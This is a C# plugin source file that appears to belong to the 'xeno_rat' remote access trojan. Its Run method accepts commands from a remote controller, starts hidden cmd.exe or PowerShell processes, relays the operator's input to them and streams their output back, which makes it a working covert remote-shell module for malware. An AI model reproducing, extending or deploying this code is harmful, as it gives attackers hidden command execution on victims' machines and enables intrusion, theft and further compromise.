using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        Process process;

        /// <summary>
        /// Runs the specified node and handles communication with it.
        /// </summary>
        /// <param name="node">The node to be run and communicated with.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the communication process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the specified node.
        /// It then enters a loop to continuously receive data from the node and handle it accordingly.
        /// If the received data is null, it terminates any existing process and breaks out of the loop.
        /// If the received data indicates a command to execute, it creates a new process and executes the command.
        /// The method also handles exceptions that may occur during the process creation and communication.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    if (process!=null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    break;
                }
                if (data[0] == 0)
                {
                    process?.StandardInput.WriteLine(Encoding.UTF8.GetString(await node.ReceiveAsync()));
                }
                else if (data[0]==1)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("cmd.exe", node);
                    }
                    catch 
                    { 
                    
                    }
                }
                else if (data[0] == 2)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("powershell.exe", node);
                    }
                    catch { }
                }
            }
            if (process != null)
                KillProcessAndChildren(process.Id);
            process?.Close();
            process?.Dispose();
        }

        /// <summary>
        /// Kills the specified process and all its child processes.
        /// </summary>
        /// <param name="pid">The process ID of the parent process to be killed.</param>
        /// <remarks>
        /// This method recursively kills the specified process and all its child processes.
        /// It first retrieves all the child processes of the specified parent process using WMI query.
        /// Then, it iterates through each child process and calls the KillProcessAndChildren method recursively to kill its children.
        /// After killing all the child processes, it attempts to kill the parent process using the Process.Kill method.
        /// If the process has already exited, it catches the ArgumentException and continues without throwing an exception.
        /// </remarks>
        /// <exception cref="ArgumentException">Thrown when the process has already exited.</exception>
        private static void KillProcessAndChildren(int pid)
        {
            // Cannot close 'system idle process'.
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
                proc.Dispose();
            }
            catch (ArgumentException)
            {
                // Process already exited.
            }
        }

        /// <summary>
        /// Creates a new process using the specified file path and redirects its standard input and output to the provided Node.
        /// </summary>
        /// <param name="path">The file path of the process to be started.</param>
        /// <param name="node">The Node to which the standard output and error of the process will be redirected.</param>
        /// <remarks>
        /// This method creates a new process using the specified file path and configures it to redirect its standard input, output, and error.
        /// The standard output and error data received from the process are sent to the provided Node after encoding them using UTF-8.
        /// The process is started in a hidden window without using the system shell.
        /// </remarks>
        public async Task CreateProc(string path, Node node) 
        {
            process = new Process();
            process.StartInfo.FileName = path;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.OutputDataReceived += async (sender, e) =>
            {
                if (e.Data != null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };

            process.ErrorDataReceived += async (sender, e) =>
            {
                if (e.Data !=null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };
            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
        }
    }
}
